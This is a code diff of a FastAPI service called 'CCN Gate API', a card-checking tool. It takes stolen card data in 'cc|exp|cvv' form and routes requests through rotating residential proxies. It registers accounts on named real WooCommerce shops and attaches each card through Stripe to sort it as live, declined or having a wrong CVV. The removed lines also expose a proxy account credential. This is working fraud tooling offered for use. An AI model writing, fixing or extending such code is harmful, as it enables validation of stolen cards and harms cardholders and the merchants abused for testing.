@@ -7,13 +7,10 @@ import random
 import asyncio
 import uuid
 import string
-import os
 from fake_useragent import UserAgent
-import json
 
 app = FastAPI(title="CCN Gate API", version="1.0.0")
 
-# Add CORS middleware
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -22,13 +19,15 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# Load proxies from environment or default
-PROXIES = [
-    "proxy.oculus-proxy.com:31112:oc-4fdb06a669141068945d2706b38709df7495b4e7b0ad9addab285d727fa8e594-country-us-session-RANDOMID:b5fl813kz0y5"
-]
+# Load proxies once
+def load_proxies(path="proxies.txt"):
+    with open(path, "r") as f:
+        return [line.strip() for line in f if line.strip()]
+
+PROXIES = load_proxies("proxies.txt")
 
 class CCRequest(BaseModel):
-    cards: str  # Format: "cc|exp|cvv" or "cc|exp|cvv,cc|exp|cvv,..."
+    cards: str  # "cc|exp|cvv,cc|exp|cvv,..."
 
 class CCResponse(BaseModel):
     card: str
@@ -48,13 +47,6 @@ def generate_nonce(length=10):
     chars = string.hexdigits.lower()
     return ''.join(random.choice(chars) for _ in range(length))
 
-async def get_proxy_ip(session):
-    try:
-        resp = await session.get("https://api.ipify.org?format=json", timeout=10)
-        return resp.json().get("ip")
-    except Exception as e:
-        return f"IP check failed: {e}"
-
 async def create_payment_method(fullz, session, proxy_url=None):
     try:
         cc, mes, ano, cvv = fullz.split("|")
@@ -73,6 +65,7 @@ async def create_payment_method(fullz, session, proxy_url=None):
         response = await session.get(
             "https://www.montrealcomicbookclub.com/my-account/", headers=headers
         )
+
         register1_nonce = gets(
             response.text,
             'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="',
@@ -92,7 +85,7 @@ async def create_payment_method(fullz, session, proxy_url=None):
             data=data,
         )
 
-        # STEP 3: go to add-payment page
+        # STEP 3: add-payment page
         response = await session.get(
             "https://www.tsclabelprinters.co.nz/my-account/add-payment-method/",
             headers=headers,
@@ -101,7 +94,7 @@ async def create_payment_method(fullz, session, proxy_url=None):
             response.text, '"createAndConfirmSetupIntentNonce":"', '","'
         )
 
-        # STEP 4: Stripe create payment method
+        # STEP 4: Stripe PM
         data = {
             "type": "card",
             "card[number]": cc,
@@ -119,14 +112,9 @@ async def create_payment_method(fullz, session, proxy_url=None):
         try:
             pm_id = resp.json().get("id")
         except Exception:
-            return {
-                "card": fullz,
-                "status": "error",
-                "message": "Failed to create Stripe PM",
-                "proxy_used": proxy_url
-            }
+            return {"card": fullz, "status": "error", "message": "Failed to create PM", "proxy_used": proxy_url}
 
-        # STEP 5: attach in Woo
+        # STEP 5: attach Woo
         data = {
             "action": "create_and_confirm_setup_intent",
             "wc-stripe-payment-method": pm_id,
@@ -139,178 +127,77 @@ async def create_payment_method(fullz, session, proxy_url=None):
             data=data,
         )
 
-        # Response handling
+        # RESPONSE HANDLING
         try:
             result = final.json()
             status = result.get("data", {}).get("status")
             error_message = result.get("data", {}).get("error", {}).get("message")
 
             if result.get("success") and status == "succeeded":
-                return {
-                    "card": fullz,
-                    "status": "success",
-                    "message": "CCN ADDED SUCCESSFULLY",
-                    "proxy_used": proxy_url
-                }
+                return {"card": fullz, "status": "success", "message": "CCN ADDED SUCCESSFULLY", "proxy_used": proxy_url}
             elif status == "order_id":
-                return {
-                    "card": fullz,
-                    "status": "charged",
-                    "message": "CCN $5 Charged",
-                    "proxy_used": proxy_url
-                }
+                return {"card": fullz, "status": "charged", "message": "CCN $5 Charged", "proxy_used": proxy_url}
             elif status == "requires_action":
-                return {
-                    "card": fullz,
-                    "status": "success",
-                    "message": "CCN ADDED SUCCESSFULLY (3DS/OTP)",
-                    "proxy_used": proxy_url
-                }
+                return {"card": fullz, "status": "success", "message": "CCN ADDED SUCCESSFULLY (3DS/OTP)", "proxy_used": proxy_url}
             elif error_message == "Your card's security code is incorrect.":
-                return {
-                    "card": fullz,
-                    "status": "invalid_cvv",
-                    "message": "INVALID CVV",
-                    "proxy_used": proxy_url
-                }
+                return {"card": fullz, "status": "invalid_cvv", "message": "INVALID CVV", "proxy_used": proxy_url}
             elif error_message == "Your card was declined.":
-                return {
-                    "card": fullz,
-                    "status": "declined",
-                    "message": "Card Declined",
-                    "proxy_used": proxy_url
-                }
+                return {"card": fullz, "status": "declined", "message": "Card Declined", "proxy_used": proxy_url}
             elif error_message == "Your card number is incorrect.":
-                return {
-                    "card": fullz,
-                    "status": "invalid_card",
-                    "message": "Incorrect card number",
-                    "proxy_used": proxy_url
-                }
+                return {"card": fullz, "status": "invalid_card", "message": "Incorrect card number", "proxy_used": proxy_url}
             elif error_message == "Your card does not support this type of purchase.":
-                return {
-                    "card": fullz,
-                    "status": "unsupported",
-                    "message": "Card does not support this type of purchase",
-                    "proxy_used": proxy_url
-                }
+                return {"card": fullz, "status": "unsupported", "message": "Card does not support this type of purchase", "proxy_used": proxy_url}
             elif error_message == "card_error":
-                return {
-                    "card": fullz,
-                    "status": "unsupported",
-                    "message": "Card type not Supported",
-                    "proxy_used": proxy_url
-                }
+                return {"card": fullz, "status": "unsupported", "message": "Card type not Supported", "proxy_used": proxy_url}
             else:
-                return {
-                    "card": fullz,
-                    "status": "unknown",
-                    "message": str(result),
-                    "proxy_used": proxy_url
-                }
+                return {"card": fullz, "status": "unknown", "message": str(result), "proxy_used": proxy_url}
         except Exception:
-            return {
-                "card": fullz,
-                "status": "error",
-                "message": final.text,
-                "proxy_used": proxy_url
-            }
+            return {"card": fullz, "status": "error", "message": final.text, "proxy_used": proxy_url}
 
     except Exception as e:
-        return {
-            "card": fullz,
-            "status": "error",
-            "message": str(e),
-            "proxy_used": proxy_url
-        }
+        return {"card": fullz, "status": "error", "message": str(e), "proxy_used": proxy_url}
 
-@app.get("/")
-async def root():
-    return {"message": "CCN Gate API is running"}
-
-@app.post("/ccngate/{cards}", response_model=List[CCResponse])
-async def check_cards_path(cards: str):
-    # Parse cards from path parameter
-    card_list = cards.split(",")[:5]  # Max 5 cards
-    
-    results = []
-    session = None
-    
-    try:
-        # Setup proxy
-        proxy_line = random.choice(PROXIES)
-        host, port, user, pwd = proxy_line.split(":")
-        if "session-RANDOMID" in user:
-            user = user.replace("session-RANDOMID", f"session-{uuid.uuid4().hex}")
-        proxy_url = f"http://{user}:{pwd}@{host}:{port}"
-        
-        session = httpx.AsyncClient(
-            proxy=proxy_url,
-            timeout=httpx.Timeout(60.0),
-            trust_env=False,
-            follow_redirects=True,
-        )
-        
-        # Process each card
-        for card in card_list:
-            if card.strip():
-                result = await create_payment_method(card.strip(), session, proxy_url)
-                results.append(result)
-                # Small delay between requests
-                await asyncio.sleep(random.uniform(1, 2))
-        
-    except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
-    finally:
-        if session:
-            await session.aclose()
-    
-    return results
-
-# Add this GET endpoint below your existing POST /ccngate endpoint
+# -----------------
+# API ENDPOINTS
+# -----------------
+async def get_session(proxy_line: str):
+    host, port, user, pwd = proxy_line.split(":")
+    if "session-RANDOMID" in user:
+        user = user.replace("session-RANDOMID", f"session-{uuid.uuid4().hex}")
+    proxy_url = f"http://{user}:{pwd}@{host}:{port}"
+    transport = httpx.AsyncHTTPTransport(proxy=proxy_url)
+    session = httpx.AsyncClient(
+        transport=transport,
+        timeout=httpx.Timeout(60.0),
+        trust_env=False,
+        follow_redirects=True,
+    )
+    return session, proxy_url
 
 @app.get("/ccngate/{cards}", response_model=List[CCResponse])
 async def check_cards_get(cards: str):
-    """
-    Browser-friendly GET endpoint.
-    Accepts single or multiple cards separated by comma:
-    e.g., 5154628580794783|06|2027|579
-    or multiple: 5154628580794783|06|2027|579,4242424242424242|12|2026|123
-    """
-    card_list = cards.split(",")
-    
+    card_list = cards.split(",")[:5]  # max 5
+    proxy_line = random.choice(PROXIES)
+    session, proxy_url = await get_session(proxy_line)
+
     results = []
-    session = None
-    
-    try:
-        # Setup proxy
-        proxy_line = random.choice(PROXIES)
-        host, port, user, pwd = proxy_line.split(":")
-        if "session-RANDOMID" in user:
-            user = user.replace("session-RANDOMID", f"session-{uuid.uuid4().hex}")
-        proxy_url = f"http://{user}:{pwd}@{host}:{port}"
-        
-        # Configure proxy using mounts
-        proxy_transport = httpx.AsyncHTTPTransport(proxy=proxy_url)
-        session = httpx.AsyncClient(
-            transport=[proxy_transport],
-            timeout=httpx.Timeout(60.0),
-            trust_env=False,
-            follow_redirects=True,
-        )
-        
-        # Process each card
-        for card in card_list[:5]:  # max 5 cards
-            if card.strip():
-                result = await create_payment_method(card.strip(), session, proxy_url)
-                results.append(result)
-                await asyncio.sleep(random.uniform(1, 2))
-    
-    except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
-    finally:
-        if session:
-            await session.aclose()
-    
+    for card in card_list:
+        if card.strip():
+            res = await create_payment_method(card.strip(), session, proxy_url)
+            results.append(res)
+    await session.aclose()
     return results
 
+@app.post("/ccngate", response_model=List[CCResponse])
+async def check_cards_post(request: CCRequest):
+    card_list = request.cards.split(",")[:5]
+    proxy_line = random.choice(PROXIES)
+    session, proxy_url = await get_session(proxy_line)
+
+    results = []
+    for card in card_list:
+        if card.strip():
+            res = await create_payment_method(card.strip(), session, proxy_url)
+            results.append(res)
+    await session.aclose()
+    return results
